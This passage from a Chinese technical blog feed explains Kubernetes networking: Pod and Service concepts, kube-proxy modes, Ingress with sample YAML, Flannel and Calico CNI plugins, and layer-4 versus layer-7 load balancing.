title="跨 Node 间 Pod 访问"></a>跨 Node 间 Pod 访问</h2><p>跨 Node 间访问，Pod 访问流量通过 veth-pair 打到 cbr0，之后转发到宿主机 eth0，之后通过 Node 之间的路由表 Route Table 进行转发。到达目标 Node 后进行相同的过程，最终转发到目标 Pod 上。</p><blockquote><p>访问流程：</p><ul><li>用户访问某个 Pod 时，首先访问的是 Kubernetes 服务。</li><li>服务通过 kube-proxy 将请求转发到后端的 Pod。</li><li>由于服务是跨节点的，kube-proxy 会根据不同的访问策略（如 iptables 或 IPVS）选择后端的 Pod。如果 Pod 位于不同的节点，流量会通过节点之间的网络进行转发。</li></ul></blockquote><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/eb084beaad664485a2bd7de0f97c0d46.png" alt="img"></p><h2 id="Pod-的定义"><a href="#Pod-的定义" class="headerlink" title="Pod 的定义"></a>Pod 的定义</h2><p>Pod 是 Kubernetes 中最小的部署单位。Pod 中包含一个或多个容器（通常是单个容器）。这些容器共享同一个网络命名空间。</p><blockquote><p>特点：</p><ul><li>每个 Pod 会被 Kubernetes 分配一个 唯一的 IP 地址，这个 IP 地址仅在集群内部有效。</li><li>Pod 的生命周期是短暂的，一个 Pod 会随着应用的部署而创建，随着应用的销毁而被删除。</li><li>Pod 通常由 Deployment、StatefulSet 或 DaemonSet 等控制器进行管理，控制器负责确保</li><li>Pod 的数量和健康状态。</li></ul></blockquote><h2 id="Service-的定义"><a href="#Service-的定义" class="headerlink" title="Service 的定义"></a><strong>Service 的定义</strong></h2><p>Service 是一个抽象，它定义了一组具有相同功能的 Pod，并为这些 Pod 提供一个固定的访问入口。Pod 的 IP 地址是动态的，可能会因为 Pod 的重启或者节点的变动而变化，Service 通过对外提供一个稳定的访问接口来解决这个问题。 </p><blockquote><p>特点：</p><ul><li>ClusterIP：这是最常见的类型，它为 Service 分配一个虚拟 IP 地址，Pod 通过该 IP 地址暴露给其他 Pod 或客户端。</li><li>NodePort：在 ClusterIP 的基础上，Service 会在每个节点上开放一个静态端口，从而使服务可以通过 NodeIP:NodePort 进行访问。</li><li>LoadBalancer：在 NodePort 的基础上，Service 会向云提供商请求创建一个外部负载均衡器，从而为外部客户端提供访问。</li><li>Headless Service：如果没有为 Service 提供 ClusterIP（即 clusterIP: None），则 Service 仅提供一组 Pod 的 DNS 名称而没有虚拟 IP。这种类型常用于 StatefulSet 等需要稳定 DNS 的场景。</li></ul></blockquote><h2 id="两者之间关系"><a href="#两者之间关系" class="headerlink" title="两者之间关系"></a>两者之间关系</h2><p>Service 通过指定选择器 (selector) 去选择与目标 Pod 匹配的标签 (labels)，找到目标 Pod 后，建立对应的 Endpoints 对象。当感知到 Service&#x2F;Endpoints&#x2F;Pod 对象变化时，创建或更新 Service 对应的 Endpoints，使得 Service selector 与 Pod labels 始终达到匹配的状态。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a993fc7a1e934a389aa83b4fdc735b55.png" alt="img"></p><h1 id="四、Kube-proxy多种模式"><a href="#四、Kube-proxy多种模式" class="headerlink" title="四、Kube-proxy多种模式"></a>四、Kube-proxy多种模式</h1><p> 在 Kubernetes 中，kube-proxy 是一种负责服务代理和负载均衡的关键组件，它允许 Kubernetes 集群中的 Pod 通过 Service 访问其他 Pod。kube-proxy 在多个网络模式下工作，控制流量如何从客户端发送到 Service 以及 Service 后端的 Pod。</p><p>Kubernetes 提供了三种 kube-proxy 的工作模式，每种模式使用不同的方式来管理流量的路由和负载均衡。以下是这三种模式的详细解释：</p><ul><li>Userspace 模式</li><li>iptables 模式</li><li>ipvs 模式</li></ul><h2 id="Userspace-模式"><a href="#Userspace-模式" class="headerlink" title="Userspace 模式"></a><strong>Userspace 模式</strong></h2><p>这是kube-proxy的最早版本，也是 Kubernetes 在早期版本中使用的默认模式，这里不多讲解，感兴趣小伙伴可以自行百度。</p><h2 id="iptables-模式"><a href="#iptables-模式" class="headerlink" title="iptables 模式"></a><strong>iptables 模式</strong></h2><p>K8s 中当前默认的 kube-proxy 模式，核心逻辑是使用 iptables 中 PREROUTING 链 nat 表，实现 Service &#x3D;&gt; Endpoints (Pod IP) 的负载均衡。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1a22d7a413db450193c1e612fc587486.png" alt="img"></p><blockquote><p>工作原理：</p><ul><li>在 iptables 模式下，kube-proxy 会通过管理 iptables 规则来处理流量的路由。当客户端请求一个 Service 时，kube-proxy 会将流量重定向到后端的 Pod。每个 Service 在 iptables 中都有一条规则，客户端的请求会根据规则被路由到某个 Pod。</li><li>iptables 可以将请求直接转发到 Pod，而不需要经过用户空间进程，因此性能得到了显著提高。</li></ul></blockquote><h2 id="ipvs-模式"><a href="#ipvs-模式" class="headerlink" title="ipvs 模式"></a><strong>ipvs 模式</strong></h2><p>ipvs是 Linux 内核提供的一个虚拟服务器模块，专门用于高效的负载均衡。相比iptables，ipvs提供了更强大、灵活的负载均衡能力。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/dd08f07685384e34bc52763b4510bf37.png" alt="img"></p><blockquote><p>工作原理：</p><ul><li>在 ipvs 模式下，kube-proxy 使用ipvs来实现负载均衡。ipvs为每个 Service 创建虚拟的 IP 地址（VIP），然后将流量根据负载均衡算法转发到后端的 Pod。</li><li>ipvs支持多种负载均衡算法，如轮询（Round Robin）、最少连接（Least Connection）、加权轮询（Weighted Round Robin）等。</li></ul></blockquote><table><thead><tr><th>模式</th><th>工作原理</th><th>优点</th><th>缺点</th><th>使用场景</th></tr></thead><tbody><tr><td>iptables</td><td>使用 Linux 内核的 <code>iptables</code> 规则来进行流量路由和负载均衡。</td><td>性能优越，简化配置。</td><td>随着规则数增多，性能会下降。负载均衡算法简单，通常是轮询。</td><td>中小规模的集群，适合大多数生产环境。</td></tr><tr><td>ipvs</td><td>使用 Linux 内核的 <code>ipvs</code> 模块来进行高效的负载均衡，支持多种负载均衡算法。</td><td>高效负载均衡，支持更多的调度算法，性能优秀。</td><td>配置复杂，需要内核支持 <code>ipvs</code> 模块。</td><td>大规模集群，高流量环境，复杂负载均衡需求</td></tr></tbody></table><h1 id="五、Ingress"><a href="#五、Ingress" class="headerlink" title="五、Ingress"></a>五、Ingress</h1><p>之前学习的svc资源，如果遇到多个服务要监听80端口时很明显无论哪种类型都无法实现，如果非要实现，就得在K8S集群外部部署一个LB设备，来代理到对应svc资源。而ingress就可以很好的解决这个问题。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5b1151206cd2452c824e6c99189bd104.png" alt="img"></p><h2 id="什么是ingress呢？"><a href="#什么是ingress呢？" class="headerlink" title="什么是ingress呢？"></a><strong>什么是ingress呢？</strong></h2><blockquote><ul><li>所谓的ingress指的是一种规则，基于用户访问的请求头路由到正确的svc。说白了就是7层代理</li><li>可惜K8S只是实现了ingress定义规则，这个规则被记录到etcd中，但并没有具体实现此功能，因此需要自行安装相应的附加组件(ingress-nginx,trafik,…)</li></ul></blockquote><h2 id="svc和ingress的区别？"><a href="#svc和ingress的区别？" class="headerlink" title="svc和ingress的区别？"></a><strong>svc和ingress的区别？</strong></h2><blockquote><ul><li>ingress和svc的区别是，svc只能实现4层的代理。而ingress实现了7层的代理。</li></ul></blockquote><h2 id="Ingress-Controller和ingress区别？"><a href="#Ingress-Controller和ingress区别？" class="headerlink" title="Ingress Controller和ingress区别？"></a><strong>Ingress Controller和ingress区别？</strong></h2><blockquote><ul><li>ingress是定义域名到svc的解析规则，好比nginx.conf配置文件。</li><li>而ingress-controller适用于执行规则的程序，好比nginx程序。</li></ul></blockquote><h2 id="Ingress-Controller和内置的Pod控制器有啥区别呢？"><a href="#Ingress-Controller和内置的Pod控制器有啥区别呢？" class="headerlink" title="Ingress Controller和内置的Pod控制器有啥区别呢？"></a><strong>Ingress Controller和内置的Pod控制器有啥区别呢？</strong></h2><blockquote><ul><li>内置的Pod控制器，比如ds,sts,deploy,jobs,cj,rs,rc等都是用来控制Pod的副本数量。</li><li>而Ingress Controller是用来解析ingress规则的，两者并没有任何关系</li></ul></blockquote><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a><strong>demo</strong></h2><p>创建工作负载</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@master231</span> <span class="hljs-string">~</span>]<span class="hljs-comment"># cat deploy-apps.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">deployment-apps-v1</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">apps:</span> <span class="hljs-string">v1</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">apps:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">c1</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.26.2</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">svc-apps</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">apps:</span> <span class="hljs-string">v1</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>创建ingress资源</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@master231 ~]<span class="hljs-comment"># cat 01-apps-ingress.yaml </span><br><span class="hljs-params">apiVersion:</span> networking.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Ingress<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> apps-ingress<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">rules:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">host:</span> apps.cherry.com<br>    <span class="hljs-params">http:</span><br>      <span class="hljs-params">paths:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">backend:</span><br>          <span class="hljs-params">service:</span><br>            <span class="hljs-params">name:</span> svc-apps<br>            <span class="hljs-params">port:</span><br>              <span class="hljs-params">number:</span> <span class="hljs-number">80</span><br>        <span class="hljs-params">path:</span> <span class="hljs-symbol">/</span><br>        <span class="hljs-params">pathType:</span> ImplementationSpecific<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes 常用的网络插件</title>
    <link href="/2025/04/16/Kubernetes-%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6/"/>
    <url>/2025/04/16/Kubernetes-%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p> 上篇内容跟大家简单聊了k8s网络模型原理。分别围绕着容器、Pod、Service、网络策略等展开了详细的讲解。这次想跟大家聊聊k8s的CNI网络插件。</p><p>CNI 是 Kubernetes 网络模型的核心组件，它是一个插件接口，允许用户选择和配置网络插件来管理 Pod 的网络。CNI 插件提供了网络连接、IP 地址分配、路由控制等基本功能。</p><p><strong>常见的 CNI 插件包括：</strong></p><p>Flannel：用于实现简单的网络隧道。</p><p>Calico：支持网络策略、跨节点网络路由等功能。</p><p>Weave：简化的网络配置，支持跨节点通信。</p><p>Cilium：基于 eBPF 技术的高性能网络插件，支持深度安全控制。</p><p>接触过K8S的同学，大致都听说过Flannel和Calico两种网络模型。这里就我们主要讲解Flannel和Calico的工作模式和原理。</p><h2 id="一、Flannel"><a href="#一、Flannel" class="headerlink" title="一、Flannel"></a>一、Flannel</h2><p>Flannel 是一个简单的网络插件，设计目的是为 Kubernetes 提供一个易于部署和配置的网络解决方案。它的目标是简化网络设置，适合那些对网络复杂度要求不高的 Kubernetes 集群。Flannel 基本上是一个 Overlay 网络 解决方案，它在每个节点上创建一个虚拟网络，并通过隧道技术（如 VXLAN、UDP、Host-GW）来实现跨节点的 Pod 网络通信。</p><ul><li>UDP</li><li>VXLAN</li><li>Host-gw</li></ul><h3 id="1-1-flannel-udp"><a href="#1-1-flannel-udp" class="headerlink" title="1.1 flannel-udp"></a>1.1 flannel-udp</h3><p>UPD模式Flannel最早实现的一种方式，也是性能最差的，目前已被弃用。但是这种方式也是最直接，最容易理解的方式，所以我们从这种方式开始介绍。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9eab445bb6cb4f5490ef462a71c6c993.png" alt="img"></p><p>上图是Flannel-UDP模式的原理图。flannel0设备是一个TUN设备，它的作用非常简单，就是在系统内核和用户应用程序之间传包；flanneld进程的职责，就是封装和解封装。数据包是如何从Node1中的container-1容器发送到Node2的container-2容器的呢？</p><p>1.数据包从container-1，来到了网桥docker0上，由于数据包的目的地址不属于网桥的网段，所以数据包经由docker0网桥，出现在宿主机上。</p><p>2.在宿主机的路由表中，去往100.96.0.0&#x2F;16网段的包经由flannel0处理。flannel0收到数据包之后，将数据包送到flanneld进程，flanneld进程会对数据包封装成一个UDP数据包，src和dst地址分别为两个容器对应的宿主机的地址。这样，数据包就可以到达Node2了。</p><p>3.数据包到达Node2的8285端口，即Node2上的flanneld进程，会被执行解封装操作，之后数据包被发送到TUN设备，即flannel0设备。剩下的事情就简单了，数据包经过docker0网桥到达container-2。</p><h3 id="1-2-Flannel-vxlan"><a href="#1-2-Flannel-vxlan" class="headerlink" title="1.2 Flannel-vxlan"></a>1.2 Flannel-vxlan</h3><p>经过上面的介绍，大家对Flannel-UDP模式大致了解了吧，那聪明的你们已经猜到为什么Flannel-UDP被弃用了吧？没错，因为效率太低了，数据包每次经过flannel0设备，都会经过内核态-用户态-内核态的这一顿折腾。</p><p>Flannel-VXLAN方案用VXLAN技术替代了flannel0设备，让数据包能够在内核态上实现数据包的封装和解封装。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/bcc35c4be7a94477ad793a524d2ca1bf.png" alt="img"></p><p>Flannel-VXLAN网络模型如图所示，你会发现，这和Flannel-UDP基本上的是一样。事实也的确如此，Flannel-VXLAN是Flannel-UDP的升级版。这里需要交代一下他们之间的不同点。</p><p>1.Flannel-UDP的TUN设备flannel0，升级成了VXLAN的VTEP设备。数据包的封装和解封装在内核态就能完成。</p><p>2.数据包的格式中，增加了VXLAN Header，这个Header的作用和Flannel-UDP的数据包中的dport:8285的作用是一样的，当数据包来到Node2时，操作系统能根据VXLAN Header，把数据包直接给到flannel.1设备。</p><h3 id="1-3-Flannel-host-gw"><a href="#1-3-Flannel-host-gw" class="headerlink" title="1.3 Flannel-host-gw"></a>1.3 Flannel-host-gw</h3><p>此时，你肯定会说，Flannel-VXLAN虽然效率提高了，但是还是用到了隧道技术，效率还是会受到影响，能不能不用隧道技术呢？答案是能。接下来我们继续探索Flannel-host-gw网络模型，一个基于三层的网络方案。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/92996b23553e4231af1533a9c9c10779.png" alt="img"></p><p>Flannel-host-gw网络模型，相比较之前的两个网络模型，隧道设备确实没有了，取而代之的是一堆路由规则。那，数据包又是怎么从container1到container2的呢？</p><p>1.当数据包从container1到了网桥之后，通过Host网络栈的路由表，发现去container2的路已经指明，经由eth0，达到Node2（10.168.0.3&#x2F;24）即可。</p><p>2.当数据包到了Node2之后，通过Host网络栈的路由表，找到cni0网桥，container2自然也就找到了。</p><p>肉眼可见，Flannel-host-gw的性能确实提高了很多，那为什么还要用Flannel-VXLAN呢？原因很明显，Flannel-host-gw只支持宿主机在二层连通的网络，并且，K8S的规模不能太大，否则每台机器的路由表就太多了。</p><h2 id="二、Calico"><a href="#二、Calico" class="headerlink" title="二、Calico"></a>二、Calico</h2><p>Calico 是一个功能强大的网络插件，提供了高效的 路由 网络架构，并支持 网络策略（Network Policy），适合大规模、复杂的 Kubernetes 集群。它不仅适用于 Overlay 网络，还支持 BGP（边界网关协议）路由，提供高性能的网络连接。</p><h3 id="2-1-Calico（非IPIP模式）"><a href="#2-1-Calico（非IPIP模式）" class="headerlink" title="2.1 Calico（非IPIP模式）"></a>2.1 Calico（非IPIP模式）</h3><p>实际上Calico网络模型的解决方案，几乎和Flannel-host-gw是一样的。不同的是Flannel-host-gw使用etcd来维护主机的路由表，而Calico则使用BGP（边界网关协议）来维护主机的路由表。BGP协议的定义看着有点高深，换成通俗的说法，大家可以理解为在每个边界网关都会都运行着一个小程序，它们会交换各自的路由信息，将需要的信息更新到自己的路由表里。BGP这个能力正好可以取代Flannel-host-gw利用Etcd维护主机上路由表的功能，并且更为强大。</p><p>除了BGP之外，Calico另外一个不同之处就在于它不需要维护一个网桥。其中BGP Client和Felix的作用是和K8S集群其他节点交换路由信息，并更新Host网络栈的路由信息。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a32ece678fe048a087b6c1b593979938.png" alt="img"></p><p>由于没有了网桥设备，每个对设备Host网络栈的这一端，需要配置一条路由规则，将目的地址为对应Container的数据包转入该对设备。对应的路由如下所示：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.1.2</span> dev cali9c02e56 scope link<br></code></pre></td></tr></table></figure><p>数据包是如何从Container1走到Container3的呢？过程基本上和Flannel-host-gw无异了。唯一区别就是数据包进出容器，不再依赖网桥，而是直接通过宿主机路由表找到容器的另一端对设备。</p><h3 id="2-2-Calico（IPIP模式）"><a href="#2-2-Calico（IPIP模式）" class="headerlink" title="2.2 Calico（IPIP模式）"></a>2.2 Calico（IPIP模式）</h3><p>Calico听着挺强大的，实则和Flannel-host-gw一样，只支持宿主机二层联通的情况。假设Container1和Container3的宿主机在不同的子网，那通过二层网络是无法将数据包传到下一跳的地址的。如图7所示，Calico会在Node1创建这样一条路由规则：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.2.0</span>/<span class="hljs-number">16</span> via <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span> eth0<br></code></pre></td></tr></table></figure><p>此时问题就出现了，下一跳是192.168.2.2，和Node1不在一个子网里，根本就找不到。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/600e6f5cb9a9459ca77357ffb02e154f.png" alt="img"></p><p>Calico的IPIP模式解决了上述问题，在每一台宿主机上，都会增加一个tunl0设备（IP隧道设备），并且会对应增加如下一条路由策略。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.2.0</span>/<span class="hljs-number">16</span> via <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span> tunl0<br></code></pre></td></tr></table></figure><p>这样一来，Container1去往Container3的数据包就会经过tunl0设备的处理，tunl0设备会在源IP报头之外新增一个外部IP报头，拿本例来说，这个外部IP报头的src和dst分别为Node1和Node2的IP，这样，数据包就伪装成了从Node1发到Node2的数据包。当数据包到达Node2之后，Node2上的tunl0会把外部IP报头拿掉，从而拿到原始的IP包。</p><p>我知道，聪明的你此时肯定会有一个更好的想法，为什么不在Router1和Router2上也用BGP协议的方式，同步容器的IP路由信息呢？这样宿主机上不就可以不用tunl0设备了么。这个方法确实很好，并且在一些场景也得到了应用。</p><h2 id="三、Flannel-vs-Calico-区别"><a href="#三、Flannel-vs-Calico-区别" class="headerlink" title="三、Flannel vs Calico 区别"></a>三、Flannel vs Calico 区别</h2><table><thead><tr><th><strong>特性</strong></th><th><strong>Flannel</strong></th><th><strong>Calico</strong></th></tr></thead><tbody><tr><td><strong>网络架构</strong></td><td>Overlay 网络（隧道模式）</td><td>基于路由（BGP 或 IP-in-IP）</td></tr><tr><td><strong>性能</strong></td><td>性能较低（因为使用隧道）</td><td>高性能，接近原生网络性能</td></tr><tr><td><strong>网络策略支持</strong></td><td>不支持网络策略</td><td>强大的网络策略支持（细粒度控制）</td></tr><tr><td><strong>配置和管理</strong></td><td>配置简单，适合快速部署</td><td>配置较复杂，但灵活性更高</td></tr><tr><td><strong>适用集群规模</strong></td><td>适合中小规模集群</td><td>适合大规模集群或跨数据中心部署</td></tr><tr><td><strong>安全控制</strong></td><td>无网络策略控制</td><td>提供丰富的安全控制和流量隔离</td></tr><tr><td><strong>支持的网络模式</strong></td><td>VXLAN, UDP, Host-GW</td><td>BGP, IP-in-IP, VXLAN 等多种模式</td></tr></tbody></table><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul><li><strong>Flannel</strong> 是一个轻量级的 Overlay 网络插件，适合中小型 Kubernetes 集群，特别是在对网络性能和安全要求不高的情况下。它安装和配置简单，但不支持网络策略，功能相对基础。</li><li><strong>Calico</strong> 提供更强大的功能，特别适合需要高性能、大规模、复杂安全控制和跨数据中心连接的 Kubernetes 集群。它不仅提供高效的网络路由（BGP），还支持细粒度的网络安全控制（通过网络策略</li></ul><p><strong>参考文献</strong></p><p>[1] 本文的图片均引自张磊老师的《深入剖析Kubernetes》</p><p>[2] Linux Bridge（网桥基础） <a href="https://link.zhihu.com/?target=https://quemingfei.com/archives/linuxbridge-wang-qiao-ji-chu-">https://quemingfei.com/archives/linuxbridge-wang-qiao-ji-chu-</a></p><p>[3] 维基百科 <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki">https://en.wikipedia.org/wiki</a></p>]]></content>
    
    
    <categories>
      
      <category>网络篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>七层和四层区别？</title>
    <link href="/2025/04/16/%E4%B8%83%E5%B1%82%E5%92%8C%E5%9B%9B%E5%B1%82%E5%8C%BA%E5%88%AB%EF%BC%9F/"/>
    <url>/2025/04/16/%E4%B8%83%E5%B1%82%E5%92%8C%E5%9B%9B%E5%B1%82%E5%8C%BA%E5%88%AB%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p> <strong>四层</strong>和<strong>七层</strong>是网络协议栈中的两个不同层级，分别对应于 <strong>OSI 模型</strong>（开放系统互联模型）中的 <strong>传输层（Layer 4）</strong> 和 <strong>应用层（Layer 7）</strong>。这两者的主要区别在于它们操作的网络层级、协议、数据处理方式以及它们在应用中的作用。</p><h2 id="1-OSI-模型概览"><a href="#1-OSI-模型概览" class="headerlink" title="1. OSI 模型概览"></a>1. <strong>OSI 模型概览</strong></h2><p>OSI 模型共有 7 层，每一层都有不同的功能，分别是：</p><ol><li><strong>物理层（Layer 1）</strong>：负责数据传输的物理媒介和信号传递。</li><li><strong>数据链路层（Layer 2）</strong>：负责节点间的可靠数据传输，解决 MAC 地址、帧传输等问题。</li><li><strong>网络层（Layer 3）</strong>：负责网络路由和寻址，如 IP 地址、路由器等。</li><li><strong>传输层（Layer 4）</strong>：负责端到端的可靠通信，如 TCP、UDP 等。</li><li><strong>会话层（Layer 5）</strong>：负责建立、管理、终止会话。</li><li><strong>表示层（Layer 6）</strong>：负责数据格式的转换、加密、解密、压缩等。</li><li><strong>应用层（Layer 7）</strong>：负责用户与网络的交互，包括具体的应用协议，如 HTTP、FTP、DNS 等。</li></ol><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/8e667709d04148ea917005907f58b794.png" alt="img"></p><h2 id="2-四层和七层的区别"><a href="#2-四层和七层的区别" class="headerlink" title="2.四层和七层的区别"></a><strong>2.四层和七层的区别</strong></h2><h3 id="2-1-四层（传输层）"><a href="#2-1-四层（传输层）" class="headerlink" title="2.1. 四层（传输层）"></a>2.1. <strong>四层（传输层）</strong></h3><ul><li><strong>操作的层次</strong>：四层操作在 OSI 模型的 <strong>传输层</strong>，负责主机之间的通信，具体关注端到端的连接、流量控制、错误校验等。它的目标是保证可靠的数据传输。</li><li><strong>协议</strong>：<ul><li><strong>TCP（传输控制协议）</strong>：提供面向连接、可靠的传输。</li><li><strong>UDP（用户数据报协议）</strong>：提供无连接、不可靠的传输。</li></ul></li><li><strong>数据处理</strong>：<ul><li>四层设备（如四层负载均衡器）处理的是 <strong>IP 地址</strong> 和 <strong>端口号</strong>，即数据包的头信息。</li><li>它不会分析数据包的内容（如 HTTP 请求中的内容），只关心目标主机的端口号和协议类型。</li></ul></li><li><strong>功能</strong>：<ul><li><strong>负载均衡</strong>：根据 IP 地址和端口进行流量分配。</li><li><strong>传输协议处理</strong>：包括流量控制、连接管理等。</li></ul></li><li><strong>使用场景</strong>：<ul><li>四层负载均衡器常用于通过 <strong>TCP&#x2F;UDP</strong> 协议提供基础的负载均衡，广泛用于简单的高效转发需求，比如数据库、文件传输等。</li></ul></li></ul><h3 id="2-2-七层（应用层）"><a href="#2-2-七层（应用层）" class="headerlink" title="2.2. 七层（应用层）"></a>2.2. <strong>七层（应用层）</strong></h3><ul><li><strong>操作的层次</strong>：七层操作在 OSI 模型的 <strong>应用层</strong>，它是离用户最近的一层，处理与应用程序相关的所有事务。它不再关注底层的网络和传输，而是处理应用级协议的交互。</li><li><strong>协议</strong>：<ul><li><strong>HTTP（超文本传输协议）</strong>：用于网页浏览。</li><li><strong>HTTPS（安全超文本传输协议）</strong>：HTTP 的加密版本。</li><li><strong>FTP（文件传输协议）</strong>：用于文件传输。</li><li><strong>SMTP（简单邮件传输协议）</strong>：用于电子邮件发送。</li><li><strong>DNS（域名系统）</strong>：用于域名解析。</li></ul></li><li><strong>数据处理</strong>：<ul><li>七层设备（如七层负载均衡器）会检查和解析请求的数据内容（如 HTTP 请求的路径、头信息、方法等），并根据具体的内容（如 URL 或 HTTP 方法）进行负载均衡或其他处理。</li></ul></li><li><strong>功能</strong>：<ul><li><strong>内容检查与路由</strong>：七层设备能够识别 HTTP 请求、分析 URL、解析请求头等。</li><li><strong>负载均衡</strong>：根据请求的内容（如 URL、查询参数、Cookie 等）来决定如何分发请求。</li><li><strong>SSL 终端</strong>：可以在七层负载均衡器处进行 SSL&#x2F;TLS 协议的加解密。</li></ul></li><li><strong>使用场景</strong>：<ul><li>七层负载均衡器通常用于 Web 应用，能够智能地基于内容进行流量路由和负载均衡，适用于 Web 服务的高可用和高扩展性需求。</li></ul></li></ul><h2 id="3-四层和七层的核心区"><a href="#3-四层和七层的核心区" class="headerlink" title="3. 四层和七层的核心区"></a>3. <strong>四层和七层的核心区</strong></h2><table><thead><tr><th><strong>特性</strong></th><th><strong>四层（传输层）</strong></th><th><strong>七层（应用层）</strong></th></tr></thead><tbody><tr><td><strong>层级</strong></td><td>传输层（Layer 4）</td><td>应用层（Layer 7）</td></tr><tr><td><strong>处理的数据</strong></td><td>基于 <strong>IP 地址</strong> 和 <strong>端口号</strong>，不关心应用数据的内容</td><td>根据具体应用协议的内容（如 HTTP 请求的 URL、头部、方法等）</td></tr><tr><td><strong>协议</strong></td><td>TCP、UDP</td><td>HTTP、HTTPS、FTP、DNS 等应用层协议</td></tr><tr><td><strong>负载均衡方式</strong></td><td>基于 IP 地址和端口的负载均衡</td><td>基于应用层数据（如请求路径、请求类型、查询参数等）的负载均衡</td></tr><tr><td><strong>功能</strong></td><td>负责端到端的通信和传输，流量控制、连接管理等</td><td>根据请求内容进行智能路由、应用协议解析、SSL 终端等</td></tr><tr><td><strong>适用场景</strong></td><td>主要用于简单、高效的传输，如 TCP&#x2F;IP 流量转发</td><td>主要用于 Web 